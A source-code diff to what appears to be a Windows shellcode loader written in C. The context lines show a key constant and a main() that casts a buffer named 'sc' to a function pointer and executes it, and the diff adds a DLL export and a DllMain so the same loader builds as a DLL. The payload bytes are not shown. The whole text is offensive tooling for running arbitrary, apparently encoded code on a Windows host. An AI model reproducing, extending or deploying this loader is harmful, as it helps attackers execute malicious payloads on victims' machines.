@@ -2,6 +2,10 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 
+#ifdef BUILDDLL
+__declspec(dllexport) void main();
+#endif
+
 #define KEY 24
 
 #include <windows.h>
@@ -189,4 +193,18 @@ int main()
 	// printf("[+] Executing...\n");
 	((void(*)())sc)();
 	return 0;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
+    BOOL bReturnValue = TRUE;
+    switch (dwReason) {
+    case DLL_PROCESS_ATTACH: {
+        break;
+    }
+    case DLL_PROCESS_DETACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+    return bReturnValue;
 }
